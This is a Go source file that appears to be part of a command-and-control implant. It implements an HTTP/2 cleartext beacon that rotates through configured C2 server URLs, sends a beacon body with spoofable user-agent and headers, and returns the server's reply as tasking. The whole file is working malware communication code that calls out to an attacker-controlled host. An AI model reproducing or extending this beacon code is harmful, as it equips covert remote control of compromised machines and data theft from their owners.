//go:build linux || windows || darwin
// +build linux windows darwin

package main

import (
	"bytes"
	"crypto/tls"
	"fmt"
	"io"
	"net"
	"net/http"
	"strings"
	"time"

	"golang.org/x/net/http2"
)

var h2cTransport = &http2.Transport{
	AllowHTTP: true,
	DialTLS: func(network, addr string, tlsConfig *tls.Config) (net.Conn, error) {
		// Dial plain TCP for h2c (no TLS)
		return net.DialTimeout(network, addr, 30*time.Second)
	},
}

var h2cClient = &http.Client{
	Transport: h2cTransport,
	Timeout:   30 * time.Second,
}

func sendH2CBeacon(body []byte) []byte {
	startIdx := int(currentC2Idx.Load())
	urls := c2URLsSnapshot()
	for i := 0; i < len(urls); i++ {
		idx := (startIdx + i) % len(urls)
		c2URL := urls[idx]

		if !strings.HasPrefix(c2URL, "h2c://") {
			continue
		}

		httpURL := "http://" + strings.TrimPrefix(c2URL, "h2c://")

		method := getActiveBeaconMethodFromConfig()
		if method == "" {
			method = "POST"
		}
		req, err := http.NewRequest(method, httpURL+getActiveBeaconURIFromConfig(), bytes.NewReader(body))
		if err != nil {
			continue
		}
		req.Header.Set("Content-Type", "application/json")
		req.Header.Set("User-Agent", getActiveUserAgentFromConfig())
		for k, v := range getActiveHeaders() {
			if strings.EqualFold(k, "Content-Type") || strings.EqualFold(k, "User-Agent") {
				continue
			}
			req.Header.Set(k, v)
		}

		// http2.Transport{AllowHTTP:true} with a plain-TCP DialTLS negotiates
		// h2c via HTTP/2 prior knowledge (it writes the client preface
		// directly), so no HTTP/1.1 Upgrade headers are needed or honored.

		resp, err := h2cClient.Do(req)
		if err != nil {
			if Debug {
				fmt.Printf("[!] H2C beacon to %s failed: %v\n", c2URL, err)
			}
			continue
		}
		defer resp.Body.Close()

		if resp.StatusCode != 200 {
			if Debug {
				fmt.Printf("[!] H2C %s returned %d\n", c2URL, resp.StatusCode)
			}
			continue
		}

		data, err := io.ReadAll(resp.Body)
		if err != nil {
			continue
		}
		currentC2Idx.Store(int32(idx))
		if Debug {
			fmt.Printf("[+] H2C Beacon OK from %s, response %d bytes\n", c2URL, len(data))
		}
		return data
	}
	return nil
}
